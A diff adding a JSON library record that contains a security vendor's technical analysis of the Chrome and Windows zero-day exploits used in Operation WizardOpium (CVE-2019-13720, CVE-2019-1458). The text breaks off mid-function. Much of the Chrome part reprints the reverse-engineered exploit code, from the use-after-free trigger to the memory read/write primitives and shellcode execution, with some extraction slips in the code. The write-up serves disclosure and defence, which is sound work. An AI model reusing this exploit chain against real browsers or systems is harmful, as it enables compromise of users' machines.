@@ -1,0 +1,253 @@
+{
+    "id": "2b91125c-a786-4c9e-9327-fb015cc4ae34",
+    "created_at": "2023-01-12T15:01:14.620544Z",
+    "updated_at": "2025-03-27T02:15:35.71031Z",
+    "deleted_at": null,
+    "sha1_hash": "fa0fe2317aef1bce54802c40c7fb535b70f7d84a",
+    "title": "2020-05-28 - The zero-day exploits of Operation WizardOpium",
+    "authors": "",
+    "file_creation_date": "2022-05-28T05:09:33Z",
+    "file_modification_date": "2022-05-28T05:09:33Z",
+    "file_size": 377371,
+    "plain_text": "# The zero-day exploits of Operation WizardOpium\n\n**[securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/](https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/)**\n\nAuthors\n\nBoris Larin\n\nAlexey Kulaev\n\nBack in October 2019 we detected a classic watering-hole attack on a North Korea-related\nnews site that exploited a chain of Google Chrome and Microsoft Windows zero-days. While\n[we’ve already published blog posts briefly describing this operation (available here and](https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/)\n[here), in this blog post we’d like to take a deep technical dive into the exploits and](https://securelist.com/windows-0-day-exploit-cve-2019-1458-used-in-operation-wizardopium/95432/)\nvulnerabilities used in this attack.\n\n## Google Chrome remote code execution exploit\n\nIn the [original blog post we described the exploit loader responsible for initial validation of the](https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/)\ntarget and execution of the next stage JavaScript code containing the full browser exploit.\nThe exploit is huge because besides code it contains byte arrays with shellcode a Portable\n\n\n-----\n\nExecutable (PE) file and WebAssembly (WASM) module used in the later stages of\nexploitation. The exploit abused a vulnerability in the WebAudio OfflineAudioContext\ninterface and was targeting two release builds of Google Chrome 76.0.3809.87 and\n77.0.3865.75. However, the vulnerability was introduced long before that and much earlier\nreleases with a WebAudio component are also vulnerable. At the time of our discovery the\ncurrent version of Google Chrome was 78, and while this version was also affected, the\nexploit did not support it and had a number of checks to ensure that it would only be\nexecuted on affected versions to prevent crashes. After our report, the vulnerability was\n[assigned CVE-2019-13720 and was fixed in version 78.0.3904.87 with the following commit.](https://chromium.googlesource.com/chromium/src.git/+/6a2e670a243b815cf043f8da4d26ecb9a64d307b)\nA use-after-free (UAF) vulnerability, it could be triggered due to a race condition between the\nRender and Audio threads:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n\nif (!buffer) {\n\n+ BaseAudioContext::GraphAutoLocker context_locker(Context());\n\n+ MutexLocker locker(process_lock_);\n\nreverb_.reset();\n\nshared_buffer_ = nullptr;\n\nreturn;\n\n\nAs you can see, when the audio buffer is set to null in ConvolverNode and an active buffer\nalready exists within the Reverb object, the function SetBuffer() can destroy reverb_ and\nshared_buffer_ objects.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\nclass MODULES_EXPORT ConvolverHandler final : public AudioHandler {\n\n...\n\nstd::unique_ptr<Reverb> reverb_;\n\nstd::unique_ptr<SharedAudioBuffer> shared_buffer_;\n\n...\n\n\nThese objects might still be in use by the Render thread because there is no proper\nsynchronization between the two threads in the code. A patch added two missing locks\n(graph lock and process lock) for when the buffer is nullified.\n\nThe exploit code was obfuscated, but we were able to fully reverse engineer it and reveal all\nthe small details. By looking at the code, we can see the author of the exploit has excellent\nknowledge of the internals of specific Google Chrome components, especially the\n\n\n-----\n\n[PartitionAlloc memory allocator. This can clearly be seen from the snippets of reverse](https://github.com/scrapy/base-chromium/blob/master/allocator/partition_allocator/PartitionAlloc.md)\nengineered code below. These functions are used in the exploit to retrieve useful information\nfrom internal structures of the allocator, including: SuperPage address, PartitionPage\naddress by index inside the SuperPage, the index of the used PartitionPage and the address\n[of PartitionPage metadata. All constants are taken from partition_alloc_constants.h:](https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/partition_alloc_constants.h)\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n\nfunction getSuperPageBase(addr) {\n\nlet superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);\n\nlet superPageBaseMask = ~superPageOffsetMask;\n\nlet superPageBase = addr & superPageBaseMask;\n\nreturn superPageBase;\n\n}\n\nfunction getPartitionPageBaseWithinSuperPage(addr, partitionPageIndex) {\n\nlet superPageBase = getSuperPageBase(addr);\n\nlet partitionPageBase = partitionPageIndex << BigInt(14);\n\nlet finalAddr = superPageBase + partitionPageBase;\n\nreturn finalAddr;\n\n}\n\nfunction getPartitionPageIndex(addr) {\n\nlet superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);\n\nlet partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);\n\nreturn partitionPageIndex;\n\n}\n\nfunction getMetadataAreaBaseFromPartitionSuperPage(addr) {\n\nlet superPageBase = getSuperPageBase(addr);\n\nlet systemPageSize = BigInt(0x1000);\n\nreturn superPageBase + systemPageSize;\n\n}\n\nfunction getPartitionPageMetadataArea(addr) {\n\nlet superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);\n\n\n-----\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n\nlet partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);\n\nlet pageMetadataSize = BigInt(0x20);\n\nlet partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr)\n+ partitionPageIndex * pageMetadataSize;\n\nreturn partitionPageMetadataPtr;\n\n}\n\n\n[It’s interesting that the exploit also uses the relatively new built-in BigInt class to handle 64-](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt)\nbit values; authors usually use their own primitives in exploits.\n\nAt first, the code initiates OfflineAudioContext and creates a huge number of IIRFilterNode\nobjects that are initialized via two float arrays.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n\nlet gcPreventer = [];\n\nlet iirFilters = [];\n\nfunction initialSetup() {\n\nlet audioCtx = new OfflineAudioContext(1, 20, 3000);\n\nlet feedForward = new Float64Array(2);\n\nlet feedback = new Float64Array(1);\n\nfeedback[0] = 1;\n\nfeedForward[0] = 0;\n\nfeedForward[1] = -1;\n\nfor (let i = 0; i < 256; i++)\n\niirFilters.push(audioCtx.createIIRFilter(feedForward, feedback));\n\n}\n\n\nAfter that, the exploit begins the initial stage of exploitation and tries to trigger a UAF bug.\nFor that to work the exploit creates the objects that are needed for the Reverb component. It\ncreates another huge OfflineAudioContext object and two ConvolverNode objects –\nScriptProcessorNode to start audio processing and AudioBuffer for the audio channel.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\nasync function triggerUaF(doneCb) {\n\nlet audioCtx = new OfflineAudioContext(2, 0x400000, 48000);\n\nlet bufferSource = audioCtx.createBufferSource();\n\nlet convolver = audioCtx.createConvolver();\n\nlet scriptNode = audioCtx.createScriptProcessor(0x4000, 1, 1);\n\nlet channelBuffer = audioCtx.createBuffer(1, 1, 48000);\n\nconvolver.buffer = channelBuffer;\n\nbufferSource buffer = channelBuffer;\n\n\n-----\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n\nbufferSource.loop = true;\n\nbufferSource.loopStart = 0;\n\nbufferSource.loopEnd = 1;\n\nchannelBuffer.getChannelData(0).fill(0);\n\nbufferSource.connect(convolver);\n\nconvolver.connect(scriptNode);\n\nscriptNode.connect(audioCtx.destination);\n\nbufferSource.start();\n\nlet finished = false;\n\nscriptNode.onaudioprocess = function(evt) {\n\nlet channelDataArray = new\nUint32Array(evt.inputBuffer.getChannelData(0).buffer);\n\nfor (let j = 0; j < channelDataArray.length; j++) {\n\nif (j + 1 < channelDataArray.length && channelDataArray[j] != 0 &&\nchannelDataArray[j + 1] != 0) {\n\nlet u64Array = new BigUint64Array(1);\n\nlet u32Array = new Uint32Array(u64Array.buffer);\n\nu32Array[0] = channelDataArray[j + 0];\n\nu32Array[1] = channelDataArray[j + 1];\n\nlet leakedAddr = byteSwapBigInt(u64Array[0]);\n\nif (leakedAddr >> BigInt(32) > BigInt(0x8000))\n\nleakedAddr -= BigInt(0x800000000000);\n\nlet superPageBase = getSuperPageBase(leakedAddr);\n\nif (superPageBase > BigInt(0xFFFFFFFF) && superPageBase <\nBigInt(0xFFFFFFFFFFFF)) {\n\nfinished = true;\n\nevt = null;\n\nbufferSource.disconnect();\n\nscriptNode.disconnect();\n\n\n-----\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n51\n\n52\n\n53\n\n54\n\n55\n\n56\n\n57\n\n58\n\n59\n\n60\n\n61\n\n62\n\n63\n\n64\n\n\nconvolver.disconnect();\n\nsetTimeout(function() {\n\ndoneCb(leakedAddr);\n\n}, 1);\n\nreturn;\n\n}\n\n}\n\n}\n\n};\n\naudioCtx.startRendering().then(function(buffer) {\n\nbuffer = null;\n\nif (!finished) {\n\nfinished = true;\n\ntriggerUaF(doneCb);\n\n}\n\n});\n\nwhile (!finished) {\n\nconvolver.buffer = null;\n\nconvolver.buffer = channelBuffer;\n\nawait later(100); // wait 100 millseconds\n\n}\n\n};\n\n\n-----\n\n65\n\n66\n\n67\n\n68\n\n69\n\n70\n\n71\n\n72\n\nThis function is executed recursively. It fills the audio channel buffer with zeros, starts\nrendering offline and at the same time runs a loop that nullifies and resets the channel buffer\nof the ConvolverNode object and tries to trigger a bug. The exploit uses the later() function to\nsimulate the Sleep function, suspend the current thread and let the Render and Audio\nthreads finish execution right on time:\n\n\n1\n\n2\n\n3\n\n\nfunction later(delay) {\n\nreturn new Promise(resolve => setTimeout(resolve, delay));\n\n}\n\n\nDuring execution the exploit checks if the audio channel buffer contains any data that differs\nfrom the previously set zeroes. The existence of such data would mean the UAF was\ntriggered successfully and at this stage the audio channel buffer should contain a leaked\npointer.\n\nThe PartitionAlloc memory allocator has a special exploit mitigation that works as follows:\nwhen the memory region is freed, it byteswaps the address of the pointer and after that the\nbyteswapped address is added to the FreeList structure. This complicates exploitation\nbecause the attempt to dereference such a pointer will crash the process. To bypass this\ntechnique the exploit uses the following primitive that simply swaps the pointer back:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nfunction byteSwapBigInt(x) {\n\nlet result = BigInt(0);\n\nlet tmp = x;\n\nfor (let i = 0; i < 8; i++) {\n\nresult = result << BigInt(8);\n\nresult += tmp & BigInt(0xFF);\n\ntmp = tmp >> BigInt(8);\n\n}\n\nreturn result;\n\n}\n\n\nThe exploit uses the leaked pointer to get the address of the SuperPage structure and\nverifies it. If everything goes to plan, then it should be a raw pointer to a temporary_buffer_\nobject of the ReverbConvolverStage class that is passed to the callback function\n_initialUAFCallback._\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n\nlet sharedAudioCtx;\n\nlet iirFilterFeedforwardAllocationPtr;\n\nfunction initialUAFCallback(addr) {\n\nsharedAudioCtx = new OfflineAudioContext(1, 1, 3000);\n\nlet partitionPageIndexDelta = undefined;\n\nswitch (majorVersion) {\n\ncase 77: // 77.0.3865.75\n\npartitionPageIndexDelta = BigInt(-26);\n\nbreak;\n\ncase 76: // 76.0.3809.87\n\npartitionPageIndexDelta = BigInt(-25);\n\nbreak;\n\n}\n\niirFilterFeedforwardAllocationPtr = getPartitionPageBaseWithinSuperPage(addr,\ngetPartitionPageIndex(addr) + partitionPageIndexDelta) + BigInt(0xFF0);\n\ntriggerSecondUAF(byteSwapBigInt(iirFilterFeedforwardAllocationPtr),\nfinalUAFCallback);\n\n}\n\n\nThe exploit uses the leaked pointer to get the address of the raw pointer to the feedforward_\narray with the AudioArray<double> type that is present in the IIRProcessor object created\nwith IIRFilterNode. This array should be located in the same SuperPage, but in different\nversions of Chrome this object is created in different PartitionPages and there is a special\ncode inside initialUAFCallback to handle that.\n\nThe vulnerability is actually triggered not once but twice. After the address of the right object\nis acquired, the vulnerability is exploited again. This time the exploit uses two AudioBuffer\nobjects of different sizes, and the previously retrieved address is sprayed inside the larger\nAudioBuffer. This function also executes recursively.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n\nlet floatArray = new Float32Array(10);\n\nlet audioBufferArray1 = [];\n\nlet audioBufferArray2 = [];\n\nlet imageDataArray = [];\n\nasync function triggerSecondUAF(addr, doneCb) {\n\nlet counter = 0;\n\nlet numChannels = 1;\n\nlet audioCtx = new OfflineAudioContext(1, 0x100000, 48000);\n\nlet bufferSource = audioCtx.createBufferSource();\n\nlet convolver = audioCtx.createConvolver();\n\nlet bigAudioBuffer = audioCtx.createBuffer(numChannels, 0x100, 48000);\n\nlet smallAudioBuffer = audioCtx.createBuffer(numChannels, 0x2, 48000);\n\nsmallAudioBuffer.getChannelData(0).fill(0);\n\nfor (let i = 0; i < numChannels; i++) {\n\nlet channelDataArray = new\nBigUint64Array(bigAudioBuffer.getChannelData(i).buffer);\n\nchannelDataArray[0] = addr;\n\n}\n\nbufferSource.buffer = bigAudioBuffer;\n\nconvolver.buffer = smallAudioBuffer;\n\nbufferSource.loop = true;\n\nbufferSource.loopStart = 0;\n\nbufferSource.loopEnd = 1;\n\nbufferSource.connect(convolver);\n\nconvolver.connect(audioCtx.destination);\n\nbufferSource.start();\n\nlet finished = false;\n\naudioCtx.startRendering().then(function(buffer) {\n\n\n-----\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n51\n\n52\n\n53\n\n54\n\n55\n\n56\n\n\nbuffer = null;\n\nif (finished) {\n\naudioCtx = null;\n\nsetTimeout(doneCb, 200);\n\nreturn;\n\n} else {\n\nfinished = true;\n\nsetTimeout(function() {\n\ntriggerSecondUAF(addr, doneCb);\n\n}, 1);\n\n}\n\n});\n\nwhile (!finished) {\n\ncounter++;\n\nconvolver.buffer = null;\n\nawait later(1); // wait 1 millisecond\n\nif (finished)\n\nbreak;\n\nfor (let i = 0; i < iirFilters.length; i++) {\n\nfloatArray.fill(0);\n\niirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);\n\nif (floatArray[0] != 3.1415927410125732) {\n\nfinished = true;\n\naudioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));\n\naudioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));\n\nbufferSource.disconnect();\n\nconvolver.disconnect();\n\nreturn;\n\n\n-----\n\n57\n\n58\n\n59\n\n60\n\n61\n\n62\n\n63\n\n64\n\n65\n\n66\n\n67\n\n68\n\n69\n\n70\n\n71\n\n72\n\n73\n\n74\n\n75\n\n76\n\n77\n\n78\n\n79\n\n80\n\n81\n\n82\n\n83\n\n84\n\n\n}\n\n}\n\nconvolver.buffer = smallAudioBuffer;\n\nawait later(1); // wait 1 millisecond\n\n}\n\n}\n\n\n-----\n\n85\n\n86\n\n87\n\nThis time the exploit uses the function getFrequencyResponse() to check if exploitation was\nsuccessful. The function creates an array of frequencies that is filled with a Nyquist filter and\nthe source array for the operation is filled with zeroes.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nvoid IIRDSPKernel::GetFrequencyResponse(int n_frequencies,\n\nconst float* frequency_hz,\n\nfloat* mag_response,\n\nfloat* phase_response) {\n\n...\n\nVector<float> frequency(n_frequencies);\n\ndouble nyquist = this->Nyquist();\n\n// Convert from frequency in Hz to normalized frequency (0 -> 1),\n\n// with 1 equal to the Nyquist frequency.\n\nfor (int k = 0; k < n_frequencies; ++k)\n\nfrequency[k] = frequency_hz[k] / nyquist;\n\n...\n\n\nIf the resulting array contains a value other than π, it means exploitation was successful. If\nthat’s the case, the exploit stops its recursion and executes the function finalUAFCallback to\nallocate the audio channel buffer again and reclaim the previously freed memory. This\nfunction also repairs the heap to prevent possible crashes by allocating various objects of\ndifferent sizes and performing defragmentation of the heap. The exploit also creates\nBigUint64Array, which is used later to create an arbitrary read/write primitive.\n\n\n1\n\n2\n\n3\n\n4\n\n\nasync function finalUAFCallback() {\n\nfor (let i = 0; i < 256; i++) {\n\nfloatArray.fill(0);\n\niirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);\n\n\n-----\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n\nif (floatArray[0] != 3.1415927410125732) {\n\nawait collectGargabe();\n\naudioBufferArray2 = [];\n\nfor (let j = 0; j < 80; j++)\n\naudioBufferArray1.push(sharedAudioCtx.createBuffer(1, 2, 10000));\n\niirFilters = new Array(1);\n\nawait collectGargabe();\n\nfor (let j = 0; j < 336; j++)\n\nimageDataArray.push(new ImageData(1, 2));\n\nimageDataArray = new Array(10);\n\nawait collectGargabe();\n\nfor (let j = 0; j < audioBufferArray1.length; j++) {\n\nlet auxArray = new\nBigUint64Array(audioBufferArray1[j].getChannelData(0).buffer);\n\nif (auxArray[0] != BigInt(0)) {\n\nkickPayload(auxArray);\n\nreturn;\n\n}\n\n}\n\nreturn;\n\n}\n\n}\n\n}\n\n\n-----\n\n33\n\n34\n\nHeap defragmentation is performed with multiple calls to the improvised collectGarbage\nfunction that creates a huge ArrayBuffer in a loop.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\nfunction collectGargabe() {\n\nlet promise = new Promise(function(cb) {\n\nlet arg;\n\nfor (let i = 0; i < 400; i++)\n\nnew ArrayBuffer(1024 * 1024 * 60).buffer;\n\ncb(arg);\n\n});\n\nreturn promise;\n\n}\n\n\nAfter those steps, the exploit executes the function kickPayload() passing the previously\ncreated BigUint64Array containing the raw pointer address of the previously freed\nAudioArray’s data.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n\nasync function kickPayload(auxArray) {\n\nlet audioCtx = new OfflineAudioContext(1, 1, 3000);\n\nlet partitionPagePtr = getPartitionPageMetadataArea(byteSwapBigInt(auxArray[0]));\n\nauxArray[0] = byteSwapBigInt(partitionPagePtr);\n\nlet i = 0;\n\ndo {\n\ngcPreventer.push(new ArrayBuffer(8));\n\nif (++i > 0x100000)\n\nreturn;\n\n} while (auxArray[0] != BigInt(0));\n\nlet freelist = new BigUint64Array(new ArrayBuffer(8));\n\ngcPreventer.push(freelist);\n\n...\n\n\nThe exploit manipulates the PartitionPage metadata of the freed object to achieve the\nfollowing behavior. If the address of another object is written in BigUint64Array at index zero\nand if a new 8-byte object is created and the value located at index 0 is read back, then a\nvalue located at the previously set address will be read. If something is written at index 0 at\nthis stage, then this value will be written to the previously set address instead.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\nfunction read64(rwHelper, addr) {\n\nrwHelper[0] = addr;\n\nvar tmp = new BigUint64Array;\n\ntmp.buffer;\n\ngcPreventer.push(tmp);\n\nreturn byteSwapBigInt(rwHelper[0]);\n\n}\n\nfunction write64(rwHelper, addr, value) {\n\nrwHelper[0] = addr;\n\nvar tmp = new BigUint64Array(1);\n\ntmp.buffer;\n\ntmp[0] = value;\n\ngcPreventer.push(tmp);\n\n}\n\n\nAfter the building of the arbitrary read/write primitives comes the final stage – executing the\ncode. The exploit achieves this by using a popular technique that exploits the Web Assembly\n(WASM) functionality. Google Chrome currently allocates pages for just-in-time (JIT)\ncompiled code with read/write/execute (RWX) privileges and this can be used to overwrite\nthem with shellcode. At first, the exploit initiates a “stub” WASM module and it results in the\nallocation of memory pages for JIT compiled code.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n\nconst wasmBuffer = new Uint8Array([...]);\n\nconst wasmBlob = new Blob([wasmBuffer], {\n\ntype: \"application/wasm\"\n\n});\n\nconst wasmUrl = URL.createObjectURL(wasmBlob);\n\nvar wasmFuncA = undefined;\n\nWebAssembly.instantiateStreaming(fetch(wasmUrl), {}).then(function(result) {\n\nwasmFuncA = result.instance.exports.a;\n\n});\n\n\nTo execute the exported function wasmFuncA, the exploit creates a FileReader object. When\nthis object is initiated with data it creates a FileReaderLoader object internally. If you can\nparse PartitionAlloc allocator structures and know the size of the next object that will be\nallocated, you can predict which address it will be allocated to. The exploit uses the\n_getPartitionPageFreeListHeadEntryBySlotSize() function with the provided size and gets the_\naddress of the next free block that will be allocated by FileReaderLoader.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n\nlet fileReader = new FileReader;\n\nlet fileReaderLoaderSize = 0x140;\n\nlet fileReaderLoaderPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist,\niirFilterFeedforwardAllocationPtr, fileReaderLoaderSize);\n\nif (!fileReaderLoaderPtr)\n\nreturn;\n\nfileReader.readAsArrayBuffer(new Blob([]));\n\nlet fileReaderLoaderTestPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist,\niirFilterFeedforwardAllocationPtr, fileReaderLoaderSize);\n\nif (fileReaderLoaderPtr == fileReaderLoaderTestPtr)\n\nreturn;\n\n\n-----\n\nThe exploit obtains this address twice to find out if the FileReaderLoader object was created\nand if the exploit can continue execution. The exploit sets the exported WASM function to be\na callback for a FileReader event (in this case, an onerror callback) and because the\nFileReader type is derived from EventTargetWithInlineData, it can be used to get the\naddresses of all its events and the address of the JIT compiled exported WASM function.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n\nfileReader.onerror = wasmFuncA;\n\nlet fileReaderPtr = read64(freelist, fileReaderLoaderPtr + BigInt(0x10)) - BigInt(0x68);\n\nlet vectorPtr = read64(freelist, fileReaderPtr + BigInt(0x28));\n\nlet registeredEventListenerPtr = read64(freelist, vectorPtr);\n\nlet eventListenerPtr = read64(freelist, registeredEventListenerPtr);\n\nlet eventHandlerPtr = read64(freelist, eventListenerPtr + BigInt(0x8));\n\nlet jsFunctionObjPtr = read64(freelist, eventHandlerPtr + BigInt(0x8));\n\nlet jsFunctionPtr = read64(freelist, jsFunctionObjPtr) - BigInt(1);\n\nlet sharedFuncInfoPtr = read64(freelist, jsFunctionPtr + BigInt(0x18)) - BigInt(1);\n\nlet wasmExportedFunctionDataPtr = read64(freelist, sharedFuncInfoPtr + BigInt(0x8))\n\n- BigInt(1);\n\nlet wasmInstancePtr = read64(freelist, wasmExportedFunctionDataPtr + BigInt(0x10))\n\n- BigInt(1);\n\nlet stubAddrFieldOffset = undefined;\n\nswitch (majorVersion) {\n\ncase 77:\n\nstubAddrFieldOffset = BigInt(0x8) * BigInt(16);\n\nbreak;\n\ncase 76:\n\nstubAddrFieldOffset = BigInt(0x8) * BigInt(17);\n\nbreak\n\n}\n\nlet stubAddr = read64(freelist, wasmInstancePtr + stubAddrFieldOffset);\n\n\n-----\n\nThe variable stubAddr contains the address of the page with the stub code that jumps to the\nJIT compiled WASM function. At this stage it’s sufficient to overwrite it with shellcode. To do\nso, the exploit uses the function getPartitionPageFreeListHeadEntryBySlotSize() again to\nfind the next free block of 0x20 bytes, which is the size of the structure for the ArrayBuffer\nobject. This object is created when the exploit creates a new audio buffer.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\nlet arrayBufferSize = 0x20;\n\nlet arrayBufferPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist,\niirFilterFeedforwardAllocationPtr, arrayBufferSize);\n\nif (!arrayBufferPtr)\n\nreturn;\n\nlet audioBuffer = audioCtx.createBuffer(1, 0x400, 6000);\n\ngcPreventer.push(audioBuffer);\n\n\nThe exploit uses arbitrary read/write primitives to get the address of the DataHolder class\nthat contains the raw pointer to the data and size of the audio buffer. The exploit overwrites\nthis pointer with stubAddr and sets a huge size.\n\n\n1\n\n2\n\n3\n\n4\n\n\nlet dataHolderPtr = read64(freelist, arrayBufferPtr + BigInt(0x8));\n\nwrite64(freelist, dataHolderPtr + BigInt(0x8), stubAddr);\n\nwrite64(freelist, dataHolderPtr + BigInt(0x10), BigInt(0xFFFFFFF));\n\n\nNow all that’s needed is to implant a Uint8Array object into the memory of this audio buffer\nand place shellcode there along with the Portable Executable that will be executed by the\nshellcode.\n\n\n1\n\n2\n\n3\n\n\nlet payloadArray = new Uint8Array(audioBuffer.getChannelData(0).buffer);\n\npayloadArray.set(shellcode, 0);\n\npayloadArray.set(peBinary, shellcode.length);\n\n\nTo prevent the possibility of a crash the exploit clears the pointer to the top of the FreeList\nstructure used by the PartitionPage.\n\n\n-----\n\n1 write64(freelist, partitionPagePtr, BigInt(0));\n\nNow, in order to execute the shellcode, it’s enough to call the exported WASM function.\n\n\n1\n\n2\n\n3\n\n\ntry {\n\nwasmFuncA();\n\n} catch (e) {}\n\n\n## Microsoft Windows elevation of privilege exploit\n\nThe shellcode appeared to be a Reflective PE loader for the Portable Executable module\nthat was also present in the exploit. This module mostly consisted of the code to escape\nGoogle Chrome’s sandbox by exploiting the Windows kernel component win32k for the\nelevation of privileges and it was also responsible for downloading and executing the actual\nmalware. On closer analysis, we found that the exploited vulnerability was in fact a zero-day.\nWe notified Microsoft Security Response Center and they assigned it CVE-2019-1458 and\nfixed the vulnerability. The win32k component has something of bad reputation. It has been\npresent since Windows NT 4.0 and, according to Microsoft, it is responsible for more than\n50% of all kernel security bugs. In the last two years alone Kaspersky has found five zerodays in the wild that exploited win32k vulnerabilities. That’s quite an interesting statistic\nconsidering that since the release of Windows 10, Microsoft has implemented a number of\nmitigations aimed at complicating exploitation of win32k vulnerabilities and the majority of\nzero-days that we found exploited versions of Microsoft Windows prior to the release of\nWindows 10 RS4. The elevation of privilege exploit used in Operation WizardOpium was\nbuilt to support Windows 7, Windows 10 build 10240 and Windows 10 build 14393. It’s also\nimportant to note that Google Chrome has a special security feature called Win32k\nlockdown. This security feature eliminates the whole win32k attack surface by disabling\naccess to win32k syscalls from inside Chrome processes. Unfortunately, Win32k lockdown is\nonly supported on machines running Windows 10. So, it’s fair to assume that Operation\nWizardOpium targeted users running Windows 7.\n\nCVE-2019-1458 is an Arbitrary Pointer Dereference vulnerability. In win32k Window objects\nare represented by a tagWND structure. There are also a number of classes based on this\nstructure: ScrollBar, Menu, Listbox, Switch and many others. The FNID field of tagWND\nstructure is used to distinguish the type of class. Different classes also have various extra\ndata appended to the tagWND structure. This extra data is basically just different structures\nthat often include kernel pointers. Besides that, in the win32k component there’s a syscall\nSetWindowLongPtr that can be used to set this extra data (after validation of course). It’s\nworth noting that SetWindowLongPtr was related to a number of vulnerabilities in the past\n(e.g., CVE-2010-2744, CVE-2016-7255, and CVE-2019-0859). There’s a [common issue](https://securelist.com/new-win32k-zero-day-cve-2019-0859/90435/)\n\n\n-----\n\nwhen pre-initialized extra data can lead to system procedures incorrectly handling. In the\ncase of CVE-2019-1458, the validation performed by SetWindowLongPtr was just\ninsufficient.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\nxxxSetWindowLongPtr(tagWND *pwnd, int index, QWORD data, ...)\n\n...\n\nif ( (int)index >= gpsi->mpFnid_serverCBWndProc[(pwnd->fnid & 0x3FFF) - 0x29A] sizeof(tagWND) )\n\n...\n\nextraData = (BYTE*)tagWND + sizeof(tagWND) + index\n\nold = *(QWORD*)extraData;\n\n*(QWORD*)extraData = data;\n\nreturn old;\n\n\nA check for the index parameter would have prevented this bug, but prior to the patch the\nvalues for FNID_DESKTOP, FNID_SWITCH, FNID_TOOLTIPS inside the\nmpFnid_serverCBWndProc table were not initialized, rendering this check useless and\nallowing the kernel pointers inside the extra data to be overwritten.\n\nTriggering the bug is quite simple: at first, you create a Window, then NtUserMessageCall\ncan be used to call any system class window procedure.\n\n1 gpsi->mpFnidPfn[(dwType + 6) & 0x1F]((tagWND *)wnd, msg, wParam, lParam,\nresultInfo);\n\nIt’s important to provide the right message and dwType parameters. The message needs to\nbe equal to WM_CREATE. dwType is converted to fnIndex internally with the following\ncalculation: (dwType + 6) & 0x1F. The exploit uses a dwType equal to 0xE0. It results in an\nfnIndex equal to 6 which is the function index of xxxSwitchWndProc and the WM_CREATE\nmessage sets the FNID field to be equal to FNID_SWITCH.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\nLRESULT xxxSwitchWndProc(tagWND 